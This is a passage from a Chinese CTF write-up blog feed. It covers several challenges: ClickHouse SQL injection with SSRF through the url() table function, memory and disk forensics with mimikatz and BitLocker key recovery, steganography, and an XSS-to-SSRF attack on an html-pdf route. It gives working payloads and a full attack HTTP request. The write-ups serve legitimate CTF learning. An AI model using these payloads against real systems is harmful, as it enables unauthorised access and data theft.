class="line">DB::Exception: user_02: <span class="keyword">Not</span> enough privileges.</span><br></pre></td></tr></table></figure><p>因此得以确定目前的用户是 user_02，且需要切换到拥有权限的 user_01。此时需要用到 ClickHouse 的 HTTP Interface，在其文档中存在如下描述，因此可知默认端口是 8123。</p><blockquote><p>The HTTP interface lets you use ClickHouse on any platform from any programming language. We use it for working from Java and Perl, as well as shell scripts. In other departments, the HTTP interface is used from Perl, Python, and Go. The HTTP interface is more limited than the native interface, but it has better compatibility.</p><p>By default, <code>clickhouse-server</code> listens for HTTP on port 8123 (this can be changed in the config).</p></blockquote><p>同时在 Table Functions 中可以发现如下使用 url 进行的操作办法。</p><blockquote><p><a href="https://clickhouse.com/docs/en/sql-reference/table-functions/url/">https://clickhouse.com/docs/en/sql-reference/table-functions/url/</a></p></blockquote><p>二者配合起来构造如下载荷，使用 user_01 去查询列，可以发现列 flag。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> url(<span class="string">&#x27;http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520name%2520from%2520system.columns%2520limit%25200,1&#x27;</span>, CSV, <span class="string">&#x27;column1 String&#x27;</span>))</span><br></pre></td></tr></table></figure><p>根据上文发现的 SQL 文件可知 flag 列位于 ctf 表中，因此构造出如下载荷来获取 flag。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> url(<span class="string">&#x27;http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520*%2520from%2520ctf.flag&#x27;</span>, CSV, <span class="string">&#x27;column1 String&#x27;</span>))</span><br><span class="line">ByteCTF&#123;e3b0c44298fc1c149afbf4c8&#125;</span><br></pre></td></tr></table></figure><h5 id="一种盲注的思路"><a href="#一种盲注的思路" class="headerlink" title="一种盲注的思路"></a>一种盲注的思路</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">39.105</span><span class="number">.175</span><span class="number">.150</span>:<span class="number">30001</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span> <span class="keyword">OR</span> startsWith((extractAll(((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> system.databases limit <span class="number">1</span>,<span class="number">1</span>)<span class="number">.2</span>), <span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]),<span class="string">&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><p>extractAll(str, ‘.’) 可以将字符串逐位分割，同时数组可以使用 [0] 进行访问而元组可以使用 .0 的方式访问。使用 startsWith 配合字符串可以进行逐位爆破。</p>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/611b2d51.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2nd 祥云杯 Quals</title>
      <link>https://lemonprefect.cn/zh-CN/posts/a282dc59.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/a282dc59.html</guid>
      <pubDate>Wed, 25 Aug 2021 09:16:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h2&gt;&lt;h3 id=&quot;层层取证&quot;&gt;&lt;a href=&quot;#层层取证&quot; class=&quot;headerlink&quot; title=&quot;层层取证&quot;&gt;&lt;/a&gt;层层取证&lt;/h3&gt;&lt;p&gt;将附件解压后得到 E01 磁盘文件和内存镜像，对内存镜像进行 imageinfo 检测可得如下结果。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;figcaption&gt;&lt;span&gt;text&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="层层取证"><a href="#层层取证" class="headerlink" title="层层取证"></a>层层取证</h3><p>将附件解压后得到 E01 磁盘文件和内存镜像，对内存镜像进行 imageinfo 检测可得如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (&#x2F;mnt&#x2F;hgfs&#x2F;f&#x2F;ghrepos&#x2F;volatility2&#x2F;imgs&#x2F;memdump.mem)</span><br><span class="line">                      PAE type : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf800040040a0L</span><br><span class="line">          Number of Processors : 2</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR for CPU 0 : 0xfffff80004005d00L</span><br><span class="line">                KPCR for CPU 1 : 0xfffff88004700000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2020-08-15 11:40:37 UTC+0000</span><br><span class="line">     Image local date and time : 2020-08-15 19:40:37 +0800</span><br></pre></td></tr></table></figure><p>使用 Win7SP1x64 作为 profile 进行 pslist，从而得出镜像抓取时的进程列表。可以发现有 FTK Imager，使用其挂载附件中给出的磁盘，可以发现如下提示。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint: 你连电脑都不能仿真打开，还想要flag ?</span><br></pre></td></tr></table></figure><h4 id="镜像仿真虚拟机"><a href="#镜像仿真虚拟机" class="headerlink" title="镜像仿真虚拟机"></a>镜像仿真虚拟机</h4><p>使用 FTK Imager 挂载上整个 E01 磁盘，然后卸载掉盘符，记下此时的索引。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629559257568922/0e21f3fd71546968853cd4fb06e95498acfa99bf.png"></p><p>此时再打开 VMware Workstation 新建虚拟机。按照前面得出的 imageinfo 选择与之对应的 Windows 7 x64，然后选择物理磁盘作为虚拟机的磁盘，然后选择对应的索引 PhysicalDrive2 挂载。成功之后将会在设置的目录处得到 vmdk 格式的磁盘文件。此时使用 Oracle Virtual Box 加载对应的 vmdk 并新建对应配置的虚拟机。完成之后即可使用 Oracle Virtual Box 启动虚拟机。</p><h4 id="mimikatz-取证出登录密码"><a href="#mimikatz-取证出登录密码" class="headerlink" title="mimikatz 取证出登录密码"></a>mimikatz 取证出登录密码</h4><p>启动系统后可以发现其需要登录密码，因此回到内存取证中去，使用 mimikatz 进行用户账户密码提取，可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Module   User             Domain           Password</span><br><span class="line">-------- ---------------- ---------------- ----------------------------------------</span><br><span class="line">wdigest  XiaoMing         PC               xiaoming_handsome</span><br><span class="line">wdigest  PC$              WORKGROUP</span><br></pre></td></tr></table></figure><p>因此可以使用 xiaoming_handsome 登录虚拟机中的系统。登录系统后可以发现其中有便签，将大片的便签挪开后可以发现有小片的便签，其中包含着一个文档的密码。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629559699202144/e1c7f88a6474ee9eb3f3b0530813140df486cf06.png"></p><p>打开此电脑后可以发现还有一个 Bitlocker 加密的驱动器，从 FTK Imager 中可以分离出对应的 dd raw 文件。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629559937081663/b42358b1f41ae99e27dd44596ece37bde38763fa.png"></p><p>将 FTK Imager 导出的镜像文件解压一次可得 dd 文件。</p><h4 id="FVEK-取证解密驱动器"><a href="#FVEK-取证解密驱动器" class="headerlink" title="FVEK 取证解密驱动器"></a>FVEK 取证解密驱动器</h4><blockquote><p><a href="https://github.com/elceef/bitlocker">https://github.com/elceef/bitlocker</a></p></blockquote><p>回到内存取证，对内存镜像使用 Volatility 的 bitlocker 插件分析可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line"></span><br><span class="line">Address : 0xfa800d12e7e0</span><br><span class="line">Cipher  : AES-128</span><br><span class="line">FVEK    : 0ff9192acdbf1df3c6dc36fb58cf76ce</span><br><span class="line">TWEAK   : b423bd84872ff72b583bb9bdee1762ac</span><br></pre></td></tr></table></figure><p>此时可以使用 bdemount 配合如下指令对驱动器进行解密。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> bdemount -k 0ff9192acdbf1df3c6dc36fb58cf76ce:b423bd84872ff72b583bb9bdee1762ac ext.dd /mnt/ctf</span><br></pre></td></tr></table></figure><p>此时在 /mnt/ctf 下可以找到 bde1 文件，将其复制到 Windows 下修正拓展名为 vhd。打开磁盘可以得到 WireShark 的流量包文件。</p><h4 id="流量包分析"><a href="#流量包分析" class="headerlink" title="流量包分析"></a>流量包分析</h4><p>使用 WireShark 对流量包进行分析，跟踪 UDP 流到 32 可以得到一个压缩文档。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629560400060461/5fd69660ae843812daf713693008aefd9584be52.png"></p><p>将其提取出来，可以在信息的部分发现如下提示。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629560520934553/ef826fd2a811437d2f1ff55a12e1853d296dd497.png"></p><p>因此使用电脑的登录密码顺利解压压缩文档。再使用电脑便签中的密码解密 Word 文档即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9ca871b668f2-b668-097c-cbm8-9op404c891e2&#125;</span><br></pre></td></tr></table></figure><h3 id="鸣雏恋"><a href="#鸣雏恋" class="headerlink" title="鸣雏恋"></a>鸣雏恋</h3><p>附件给出的压缩包中有一个 Word 文档，在其 _rels 文件夹下可以发现两个文件。将其解压出来，在 key.txt 中可以发现如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">佩恩‌‌‌‌‍‌‌‬‌‌‌‌‍‬‍‍:凭你这点力量,‌‌‌‌‍‬‌﻿‌‌‌‌‍‬‌‍为什么要战斗‌‌‌‌‍﻿‍‍?</span><br><span class="line">‌‌‌‌‍﻿‌﻿‌‌‌‌‍‬‍‍‌‌‌‌‌‬‌‌雏田‌‌‌‌‍‌‬‍‌‌‌‌‌‬‌‌‌‌‌‌‍‬﻿‌:说到做到‌‌‌‌‍‬‬‍‌‌‌‌‍‬‬﻿‌‌‌‌‍‬‍‍,‌‌‌‌‌‬‌‌勇往直前‌‌‌‌‍‬﻿‬,‌‌‌‌‍‬‌‍这就是我的忍道.‌‌‌‌‍﻿‌‬‌‌‌‌‍﻿‍‍‌‌‌‌‍﻿‍‌‌‌‌‌‍‬﻿﻿‌‌‌‌‌‬‌‌‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‍‌‌‌‌‍﻿‌﻿‌‌‌‌‍﻿‍‌</span><br></pre></td></tr></table></figure><p>对这个字符串使用零宽字符隐写解码可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Because I like naruto best</span><br></pre></td></tr></table></figure><p>使用这个字符串做为密码解压上述得到的另一个文件，可以得到一堆图片。使用如下脚本将其转换为 0/1 数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">temp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">129488</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(<span class="string">f&quot;G:\\out\\<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">    temp += <span class="built_in">str</span>(image.getpixel((<span class="number">0</span>,<span class="number">0</span>)))</span><br><span class="line">result_file = <span class="built_in">open</span>(<span class="string">&quot;./result.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">result_file.write(temp)</span><br><span class="line">result_file.flush()</span><br><span class="line">result_file.close()</span><br></pre></td></tr></table></figure><p>将得到的数据使用如下 CyberChef Receipt 处理可以得到一张图片。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">From_Binary(&#39;Space&#39;,8)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;data:image&#x2F;png;base64,&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">Render_Image(&#39;Base64&#39;)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629648431415173/c34cb618537e14c97fccd8dfc9cda7bea3a17675.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;57dd74fb21bb1aee50f19421bf836f23&#125;</span><br></pre></td></tr></table></figure><h3 id="考古"><a href="#考古" class="headerlink" title="考古"></a>考古</h3><blockquote><p>小明在家里翻到一台很古老的xp笔记本，换电池之后发现可以正常开机，但是发现硬盘空间不足。清理过程中却发生了一些不愉快的事情…</p></blockquote><p>对给出的内存镜像使用 Volatility 分析，imageinfo 可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (&#x2F;mnt&#x2F;hgfs&#x2F;f&#x2F;ghrepos&#x2F;volatility2&#x2F;imgs&#x2F;memory)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0xa8f000L</span><br><span class="line">                          KDBG : 0x80545ce0L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 2</span><br><span class="line">                KPCR for CPU 0 : 0xffdff000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2021-08-06 16:43:57 UTC+0000</span><br><span class="line">     Image local date and time : 2021-08-07 00:43:57 +0800</span><br></pre></td></tr></table></figure><p>使用 <code>filescan | grep &quot;桌面&quot;</code> 可以发现其桌面有如下可疑文件。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000001956d88      1      0 R--r-d \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\Oneclickcleanup.exe</span><br></pre></td></tr></table></figure><p>使用 dumpfiles 将文件提取出来。</p><h4 id="Usher’s-Reverse-Part"><a href="#Usher’s-Reverse-Part" class="headerlink" title="Usher’s Reverse Part"></a>Usher’s Reverse Part</h4><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629649347231569/35876a9a44d17814ad26df92965a717f3761a1b1.png"></p><p>在这一行下断点，运行到断下来。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629649404001988/b79783be589ec2ea4d499b91557bc68bb2e851c0.png"></p><p>此时修改所打开的文件名，保存后 F9 跑完就可以得到另一个文件。将所得的文件按位异或 0x2D 即可在文件中找到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8bedfdbb-ba42-43d1-858c-c2a5-5012d309&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Secrets-Of-Admin"><a href="#Secrets-Of-Admin" class="headerlink" title="Secrets_Of_Admin"></a>Secrets_Of_Admin</h3><blockquote><p>Reveal the secret of admin for me.</p></blockquote><p>在题目给出的源码中可以发现用户 admin 及其登录密码 e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645。同时还能发现 flag 及其 checksum be5a14a8e504a66979f6938338b0662c。</p><p>在 index.ts 下可以发现使用 127.0.0.1 请求可以添加文件记录的路由。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// You can also add file logs here!</span></span><br><span class="line">router.get(<span class="string">&#x27;/api/files&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next(createError(<span class="number">401</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; username , filename, checksum &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(username) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(filename) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(checksum) == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> DB.Create(username, filename, checksum)</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&#x27;Parameters error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>因此需要想办法进行 XSS 或者 SSRF，增加一条文件记录，让 flag 的文件也同时属于 admin，此时才能用其 checksum 读取到。正好这里有一个使用 html-pdf 进行 HTML 转 PDF 的路由，因此可以尝试使用这个路由进行 XSS。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/admin&#x27;</span>, checkAuth, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; content &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> ( content == <span class="string">&#x27;&#x27;</span> || content.includes(<span class="string">&#x27;&lt;&#x27;</span>) || content.includes(<span class="string">&#x27;&gt;&#x27;</span>) || content.includes(<span class="string">&#x27;/&#x27;</span>) || content.includes(<span class="string">&#x27;script&#x27;</span>) || content.includes(<span class="string">&#x27;on&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// even admin can&#x27;t be trusted right ? :)  </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden word 🤬&#x27;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;<span class="subst">$&#123;content&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        `</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> filename = <span class="string">`<span class="subst">$&#123;uuid()&#125;</span>.pdf`</span></span><br><span class="line">            pdf.create(template, &#123;</span><br><span class="line">                <span class="string">&quot;format&quot;</span>: <span class="string">&quot;Letter&quot;</span>,</span><br><span class="line">                <span class="string">&quot;orientation&quot;</span>: <span class="string">&quot;portrait&quot;</span>,</span><br><span class="line">                <span class="string">&quot;border&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">                <span class="string">&quot;renderDelay&quot;</span>: <span class="number">3000</span>,</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">5000</span></span><br><span class="line">            &#125;).toFile(<span class="string">`./files/<span class="subst">$&#123;filename&#125;</span>`</span>, <span class="keyword">async</span> (err, _) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) next(createError(<span class="number">500</span>));</span><br><span class="line">                <span class="keyword">const</span> checksum = <span class="keyword">await</span> getCheckSum(filename);</span><br><span class="line">                <span class="keyword">await</span> DB.Create(<span class="string">&#x27;superuser&#x27;</span>, filename, checksum)</span><br><span class="line">                <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">message</span> : <span class="string">`Your pdf is successfully saved 🤑 You know how to download it right?`</span>&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span> : <span class="string">&#x27;Failed to generate pdf 😥&#x27;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以发现这里对提交的 content 使用 include 进行了过滤，因此可以使用数组绕过。使用如下请求即可成功写入一段 XSS 进而修改数据库内容。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>eci-2zedk1cbvvahlm83mpwj.cloudeci1.ichunqiu.com:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>239</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://eci-2zedk1cbvvahlm83mpwj.cloudeci1.ichunqiu.com:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://eci-2zedk1cbvvahlm83mpwj.cloudeci1.ichunqiu.com:8888/admin</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1629598751; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1629598751; UM_distinctid=17b6ba7974b4b4-0499fe9efa6a05-b7a1d3b-144000-17b6ba7974c5ea; __jsluid_h=653dc6064ed641b63bdff02b1a713cc4; token=s%3Aj%3A%7B%22username%22%3A%22admin%22%2C%22files%22%3A%5B%5D%2C%22isAdmin%22%3Atrue%7D.F56WSi1msokS7QwqhYWcJm%2FBhe1UiZ%2FxOtKnM%2BaehVU</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">content[]=&lt;script&gt;var+url%3d&quot;http%3a//127.0.0.1%3a8888/api/files%3fusername%3dadmin%26filename%3d../files/flag%26checksum%3dbe5a14a8e504a66979f6938338b0662c&quot;%3bquery%3dnew+XMLHttpRequest()%3bquery.open(&#x27;get&#x27;,url)%3bquery.send()%3b&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>访问到 /api/files/be5a14a8e504a66979f6938338b0662c 即可下载到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bf60142a-ebb2-47c2-93c3-6087340c0df0&#125;</span><br></pre></td></tr></table></figure><h3 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h3><blockquote><p>crawler_z is a website supported with crawler and bucket, can you find a way to RCE?</p></blockquote><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>在 user.js 下可以发现如下关键代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 